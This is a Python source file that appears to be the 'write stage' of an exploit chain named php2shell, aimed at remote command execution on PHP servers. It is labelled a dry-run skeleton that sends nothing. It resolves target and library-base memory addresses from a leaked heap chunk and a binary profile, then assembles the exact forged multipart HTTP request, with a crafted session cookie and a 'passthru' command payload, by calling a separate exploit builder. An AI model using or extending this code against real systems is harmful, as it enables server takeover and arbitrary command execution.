"""write_stage.py - write stage (wired, dry-only: --step write_stage).

DRY SKELETON matching the not-implemented claims: this module wires the
documented live call path into a --step dry receipt but contains NO
exploitation logic beyond the existing placeholder:

- the byte recipe is built by the documented live builder
  tool/modules/compact-stock-tail.py:COMPACT.probe_body(15 args) — the exact
  call tool/php2shell.py:attempt() already performs; nothing new here;
- ``stage_body()`` (the negative-``used_slots`` math extraction) remains an
  unimplemented placeholder by design — see its docstring;
- nothing is ever sent: the module has no send path at all. Byte templates are
  recorded for the receipt, addresses slots come from the operator-supplied
  --main-chunk (the live leak is a separate stage; no network side effects).
"""


import argparse
import hashlib
import importlib.util
import json
from pathlib import Path

HERE = Path(__file__).resolve().parent


def _load_compact():
    spec = importlib.util.spec_from_file_location(
        "compact_stock_tail", HERE / "compact-stock-tail.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def stage_body(*args, **kwargs):
    """Raised NotImplementedError by design — see module docstring."""


    raise NotImplementedError(
        "Not implemented (chain stage write_stage): use the live path "
        "tool/php2shell.py:attempt() -> tool/modules/compact-stock-tail.py:"
        "COMPACT.probe_body(...), or implement the negative used_slots math "
        "here."
    )


def resolve_addresses(main_chunk: int, ordinal: int, profile: dict) -> dict:
    """Pure arithmetic, no leakage needed: the (target, dso_base, stage_delta)
    triple exactly as php2shell.py:attempt() computes it from a peeled main."""
    if "dso_deltas" not in profile or "target_offset" not in profile \
            or "stage_offset" not in profile:
        raise ValueError("profile lacks the write-stage offsets "
                         "(target_offset/stage_offset/dso_deltas)")
    if not 0 <= ordinal < len(profile["dso_deltas"]):
        raise ValueError(
            f"ordinal {ordinal} out of range for "
            f"profile {profile.get('name')}: dso_deltas has "
            f"{len(profile['dso_deltas'])} entr(ies)"
        )
    if main_chunk & (0x200000 - 1):
        raise ValueError("main chunk must be 2 MiB-aligned (0x200000)")
    target = main_chunk + profile["target_offset"]
    stage = main_chunk + profile["stage_offset"]
    dso_base = main_chunk - profile["dso_deltas"][ordinal]
    return {
        "main": f"0x{main_chunk:x}",
        "target": f"0x{target:x}",
        "stage": f"0x{stage:x}",
        "stage_delta": f"0x{stage - target:x}",
        "dso_base": f"0x{dso_base:x}",
        "dso_delta": f"0x{profile['dso_deltas'][ordinal]:x}",
    }


def dry(main_chunk: int, ordinal: int, payload: str, profile: dict,
        output: Path) -> dict:
    """Dry skeleton: build the exact attempt()-shaped final multipart bytes.

    Same documented live call: COMPACT.probe_body(100, 39, 39, 11, True, 2,
    8000, 6000, False, True, target, dso_base, stage_delta, ordinal, payload).
    Nothing is sent (no transport in this module at all).
    """
    if main_chunk <= 0 or main_chunk >= 1 << 64:
        raise ValueError("main chunk must be a positive 64-bit value")
    if not isinstance(payload, str) or not payload.startswith("passthru-"):
        raise ValueError("payload must be the driver's passthru-<command> string")
    compact = _load_compact()
    addresses = resolve_addresses(main_chunk, ordinal, profile)
    body = compact.probe_body(
        100, 39, 39, 11, True, 2, 8000, 6000, False, True,
        main_chunk + profile["target_offset"],
        main_chunk - profile["dso_deltas"][ordinal],
        int(addresses["stage_delta"], 16),
        ordinal,
        payload,
    )
    request = (
        b"POST [" + profile["name"].encode() + b"-path] HTTP/1.1\r\n"
        b"Host: [target-host]\r\n"                       # placeholder framing:
        b"Cookie: PHPSESSID=rearm" + str(ordinal).encode() + b"b\r\n"   # live path
        + b"Content-Type: multipart/form-data; boundary="
        + compact.BOUNDARY + b"\r\n"                     # fills these (php2shell.
        + b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n"
        + body                                            # multipart_request)
    )
    output.mkdir(parents=True, exist_ok=True)
    artifacts = {
        "write-stage-request.bin": request,
        "write-stage-body.bin": body,
    }
    artifacts_meta = {
        name: {"bytes": len(data), "sha256": hashlib.sha256(data).hexdigest()}
        for name, data in artifacts.items()
    }
    for name, data in artifacts.items():
        (output / name).write_bytes(data)
    return {
        "stage": "write_stage",
        "dry_run": True,
        "sent": False,
        "note": "dry-only skeleton: exact attempt()-shaped final multipart "
                "bytes; the send + exploitation stay in the live chain step",
        "leak_substitute": "operator-supplied --main-chunk (no live leak here)",
        "main": addresses["main"],
        "ordinal": ordinal,
        "addresses": addresses,
        "payload": payload,
        "profile": profile["name"],
        "final_parts": 116,  # attempt() run metadata; COMPACT accounting TODO
        "multipart_boundary": compact.BOUNDARY.decode("latin1"),
        "artifacts": artifacts_meta,
    }


def main() -> int:  # pragma: no cover - thin CLI wrapper, exercised via the driver
    parser = argparse.ArgumentParser(
        description="write stage dry skeleton: build the attempt()-shaped "
        "final forged multipart bytes WITHOUT sending")
    parser.add_argument("--main-chunk", required=True,
                        help="leaked main chunk hex (0x…); drivers the triple")
    parser.add_argument("--ordinal", type=int, default=0)
    parser.add_argument("--profile", required=True,
                        help="path to a BINARY_PROFILES-style json (name/"
                        "target_offset/stage_offset/dso_deltas)")
    parser.add_argument("--payload", default="passthru-id")
    parser.add_argument("--output", required=True, type=Path)
    args = parser.parse_args()
    profile = json.loads(Path(args.profile).read_text())
    summary = dry(
        int(args.main_chunk, 16), args.ordinal, args.payload, profile, args.output)
    (args.output / "result.json").write_text(
        json.dumps(summary, indent=2, sort_keys=True) + "\n")
    print(json.dumps({k: v for k, v in summary.items() if k != "artifacts"},
                     indent=2, sort_keys=True))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
